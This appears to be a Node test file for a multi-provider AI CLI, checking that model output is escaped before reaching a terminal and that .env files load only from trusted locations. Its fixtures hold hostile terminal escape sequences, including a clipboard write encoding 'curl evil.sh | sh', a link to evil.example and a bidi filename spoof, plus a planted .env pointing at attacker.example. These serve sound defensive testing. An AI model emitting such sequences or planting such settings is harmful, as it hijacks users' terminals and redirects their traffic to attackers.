import { describe, it, before, after, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, chmodSync, readFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { spawnSync } from 'node:child_process';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { createRequire } from 'node:module';
import { safeForTerminal, safeDeep } from '../src/util/terminal.ts';
import { loadTrustedEnv, findPackageRoot, untrustedReason } from '../src/util/env.ts';
import { renderBoardroom } from '../src/boardroom/render.ts';
import { renderMotion } from '../src/motion/render.ts';
import { writeMinutes } from '../src/motion/minutes.ts';
import { renderDelegation, renderVerifyCatalog } from '../src/delegate/render.ts';
import { logger } from '../src/util/logger.ts';
import type { BoardroomResult } from '../src/boardroom/protocol.ts';
import type { MotionResult } from '../src/motion/types.ts';
import type { DelegateResult } from '../src/delegate/escalate.ts';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..');

// What a hostile response would try: clear the screen and forge a status
// line, overwrite the line with a carriage return, set the clipboard (OSC 52),
// plant a hyperlink (OSC 8), use a C1 CSI, and reorder text with a bidi override.
const CLEAR = '\u001b[2J\u001b[H';
const CLIPBOARD = '\u001b]52;c;Y3VybCBldmlsLnNoIHwgc2g=\u0007';
const LINK = '\u001b]8;;https://evil.example\u001b\\click\u001b]8;;\u001b\\';
const HOSTILE =
  `${CLEAR}BOARDROOM SECURITY CHECK PASSED\rOverwritten${CLIPBOARD}${LINK}\u009b31m` +
  `invoice-‮gpj.exe`;

/** Fragments of HOSTILE that must never reach a terminal intact. */
const LIVE = ['\u001b[2J', '\u001b]52;', '\u001b]8;', '\u0007', '\u009b', '\r', '‮'];

function assertInert(out: string, where: string) {
  for (const seq of LIVE) {
    assert.ok(!out.includes(seq), `${where}: live sequence ${JSON.stringify(seq)} reached output`);
  }
  assert.ok(out.includes('\\x1b[2J'), `${where}: the attempt should be visible, escaped`);
}

/** Run `fn` and return everything it printed to stdout and stderr. */
function capture(fn: () => void): string {
  const out: string[] = [];
  const log = console.log;
  const err = console.error;
  console.log = (...a: unknown[]) => { out.push(a.map(String).join(' ')); };
  console.error = (...a: unknown[]) => { out.push(a.map(String).join(' ')); };
  try {
    fn();
  } finally {
    console.log = log;
    console.error = err;
  }
  return out.join('\n');
}

describe('BR-011: provider text is inert on a terminal', () => {
  it('escapes control and bidi characters visibly, and keeps ordinary text', () => {
    const s = safeForTerminal(HOSTILE);
    assertInert(s, 'safeForTerminal');
    assert.ok(s.includes('\\x1b]52;'));
    assert.ok(s.includes('\\x9b31m'));
    assert.ok(s.includes('\\u202e'));
    assert.equal(safeForTerminal('line one\n\tindented — café 日本語 🚀'), 'line one\n\tindented — café 日本語 🚀');
    assert.equal(safeForTerminal('a\r\nb'), 'a\nb', 'CRLF is just a newline');
  });

  it('copies every string in a result and leaves the original untouched', () => {
    const raw = { text: HOSTILE, nested: [{ reason: HOSTILE }], cost: 1.5, ok: true, none: null };
    const safe = safeDeep(raw);
    assertInert(JSON.stringify(safe.nested[0].reason), 'safeDeep');
    assert.equal(safe.cost, 1.5);
    assert.equal(safe.ok, true);
    assert.equal(safe.none, null);
    assert.equal(raw.text, HOSTILE, 'the raw result is kept for --json');
  });

  it('renders board answers, errors and model ids inert', () => {
    const answer = (over: Record<string, unknown> = {}) => ({
      panelist: 'openai', role: 'COO', model: `gpt${CLEAR}`, text: HOSTILE,
      inputTokens: 1, outputTokens: 1, cost: 0, durationMs: 1, ...over,
    });
    const r: BoardroomResult = {
      question: 'q',
      briefing: { text: HOSTILE, source: 'perplexity', model: 'sonar-pro', inputTokens: 1, outputTokens: 1, cost: 0, durationMs: 1 },
      round1: [answer(), answer({ text: '', error: `API error: 400 ${HOSTILE}` })],
      round2: [answer()],
    };
    assertInert(capture(() => renderBoardroom(r)), 'renderBoardroom');
    assert.equal(r.briefing!.text, HOSTILE, 'render does not mutate the result');
  });

  function motion(): MotionResult {
    const seat = { panelist: 'openai', role: 'COO', model: 'gpt-5.6-sol', inputTokens: 1, outputTokens: 1, cost: 0, durationMs: 1 };
    return {
      id: '2026-11-22-20-00-00-abcd',
      motion: HOSTILE,
      mover: 'the founder',
      startedAt: new Date().toISOString(),
      briefing: { text: HOSTILE, source: 'perplexity', model: 'sonar-pro', inputTokens: 1, outputTokens: 1, cost: 0, durationMs: 1 },
      seconds: [{ ...seat, seconded: true, reason: HOSTILE }, { ...seat, seconded: false, reason: '', error: HOSTILE }],
      debate: [{ ...seat, stance: 'SUPPORT', case: HOSTILE }],
      votes: [{ ...seat, vote: 'NAY', reason: HOSTILE, flipped: true }, { ...seat, vote: 'AYE', reason: 'ok', flipped: false }],
      tally: { aye: 1, nay: 1, abstain: 0 },
      outcome: 'tied',
    };
  }

  it('renders motions inert, on screen and in the minutes file', () => {
    let tmp = '';
    const home = process.env.HOME;
    try {
      tmp = mkdtempSync(join(tmpdir(), 'boardroom-br011-'));
      process.env.HOME = tmp;
      const m = motion();
      assertInert(capture(() => renderMotion(m)), 'renderMotion');
      assertInert(readFileSync(writeMinutes(m), 'utf-8'), 'minutes file');
    } finally {
      process.env.HOME = home;
      if (tmp) rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('renders delegation results and catalog checks inert', () => {
    const d: DelegateResult = {
      task: 't', cls: 'draft', classifiedWhy: HOSTILE, startTier: 'cheap', startWhy: HOSTILE,
      attempts: [{
        tier: 'cheap', vendor: 'google', model: 'm', text: HOSTILE, cost: 0, durationMs: 1, outcome: 'refuted',
        verdict: { kind: 'refuted', defect: HOSTILE, why: HOSTILE }, verdictBy: `deepseek:${CLEAR}`,
      }],
      answer: HOSTILE, answerOutcome: 'refuted', finalOutcome: 'refuted', totalCost: 0, stoppedBecause: HOSTILE,
    };
    assertInert(capture(() => renderDelegation(d, true)), 'renderDelegation');
    // Model ids and error details on this path come from the vendors' own API.
    const out = capture(() =>
      renderVerifyCatalog({
        ok: false,
        incomplete: true,
        reports: [
          { vendor: 'openai', status: 'stale', confirmed: [], missing: [HOSTILE], uncatalogued: [HOSTILE] },
          { vendor: 'xai', status: 'unreachable', detail: HOSTILE, confirmed: [], missing: [], uncatalogued: [] },
        ],
      }),
    );
    assertInert(out, 'renderVerifyCatalog');
  });

  it('makes log lines inert, including Error objects', () => {
    assertInert(capture(() => logger.warn('SSE parse failed:', HOSTILE, new Error(HOSTILE))), 'logger');
  });
});

describe('BR-006: .env is read only from trusted places', () => {
  let root: string;
  let pkg: string;
  let bin: string;
  let home: string;
  let elsewhere: string;
  let notices: string[];

  const write = (path: string, body: string) => {
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, body, { mode: 0o600 });
    chmodSync(path, 0o600);
  };
  const load = (cwd: string, target: NodeJS.ProcessEnv = {}) => {
    const report = loadTrustedEnv({ binDir: bin, cwd, home, target, warn: m => notices.push(m) });
    return { target, report };
  };

  before(() => {
    root = mkdtempSync(join(tmpdir(), 'boardroom-br006-'));
  });
  after(() => rmSync(root, { recursive: true, force: true }));
  beforeEach(() => {
    const t = mkdtempSync(join(root, 't-'));
    pkg = join(t, 'boardroom-install');
    bin = join(pkg, 'dist', 'bin');
    home = join(t, 'home');
    elsewhere = join(t, 'cloned-repo');
    mkdirSync(bin, { recursive: true });
    mkdirSync(home, { recursive: true });
    mkdirSync(elsewhere, { recursive: true });
    writeFileSync(join(pkg, 'package.json'), JSON.stringify({ name: 'boardroom' }));
    notices = [];
  });

  it('ignores a .env in the directory it is run from, and says so', () => {
    write(join(elsewhere, '.env'), 'BOARDROOM_BACKEND=ollama\nOLLAMA_HOST=http://attacker.example:11434\n');
    const { target, report } = load(elsewhere);
    assert.equal(target.BOARDROOM_BACKEND, undefined);
    assert.equal(target.OLLAMA_HOST, undefined);
    assert.equal(report.ignored, join(elsewhere, '.env'));
    assert.equal(notices.length, 1);
    assert.match(notices[0], /ignoring .*cloned-repo.*\.env/);
  });

  it('reads ~/.boardroom/.env and the install directory, in that order', () => {
    write(join(home, '.boardroom', '.env'), 'OPENAI_API_KEY=from-home\nSHARED=home\n');
    write(join(pkg, '.env'), 'ANTHROPIC_API_KEY=from-install\nSHARED=install\n');
    const { target, report } = load(elsewhere, { SHARED_REAL: 'x' });
    assert.equal(target.OPENAI_API_KEY, 'from-home');
    assert.equal(target.ANTHROPIC_API_KEY, 'from-install');
    assert.equal(target.SHARED, 'home', 'the per-user file beats the install directory');
    assert.equal(report.loaded.length, 2);
    assert.deepEqual(notices, []);
  });

  it('never overrides the real environment', () => {
    write(join(home, '.boardroom', '.env'), 'BOARDROOM_SESSION_CAP=none\n');
    const { target } = load(elsewhere, { BOARDROOM_SESSION_CAP: '0.50' });
    assert.equal(target.BOARDROOM_SESSION_CAP, '0.50');
  });

  it('reads the install directory .env when run from there, without a notice', () => {
    write(join(pkg, '.env'), 'OPENAI_API_KEY=k\n');
    const { target, report } = load(pkg);
    assert.equal(target.OPENAI_API_KEY, 'k');
    assert.equal(report.ignored, undefined);
    assert.deepEqual(notices, []);
  });

  it('skips a settings file that others can write', { skip: !process.getuid && 'POSIX only' }, () => {
    const path = join(home, '.boardroom', '.env');
    write(path, 'BOARDROOM_BACKEND=ollama\n');
    chmodSync(path, 0o666);
    const { target, report } = load(elsewhere);
    assert.equal(target.BOARDROOM_BACKEND, undefined);
    assert.equal(report.skipped[0].path, path);
    assert.match(report.skipped[0].reason, /writable by group or others/);
    assert.match(notices[0], /chmod 600/);
    chmodSync(path, 0o600);
    assert.equal(untrustedReason(path), null);
  });

  it('finds the package root from the source and the built entry point', () => {
    assert.equal(findPackageRoot(join(REPO, 'bin')), REPO);
    assert.equal(findPackageRoot(join(REPO, 'dist', 'bin')), REPO);
    assert.equal(findPackageRoot(elsewhere), null);
  });

  it(
    'the CLI does not follow a planted .env to an attacker backend',
    { skip: existsSync(join(REPO, '.env')) && 'this checkout has its own .env; spawning the CLI would read it' },
    () => {
      write(join(elsewhere, '.env'), 'BOARDROOM_BACKEND=ollama\nOLLAMA_HOST=http://127.0.0.1:9\n');
      const tsx = pathToFileURL(createRequire(import.meta.url).resolve('tsx/esm')).href;
      const run = spawnSync(
        process.execPath,
        ['--import', tsx, join(REPO, 'bin', 'boardroom.ts'), 'delegate', '--json', 'x'],
        {
          cwd: elsewhere,
          encoding: 'utf-8',
          env: {
            PATH: process.env.PATH, HOME: home,
            ANTHROPIC_API_KEY: '', OPENAI_API_KEY: '', XAI_API_KEY: '',
            GOOGLE_API_KEY: '', DEEPSEEK_API_KEY: '', PERPLEXITY_API_KEY: '', OPENROUTER_API_KEY: '',
          },
          timeout: 30_000,
        },
      );
      assert.match(run.stderr, /No providers detected/, 'the planted backend was not used');
      assert.match(run.stderr, /ignoring .*\.env/);
      assert.equal(run.stdout, '');
      assert.equal(run.status, 1);
    },
  );
});
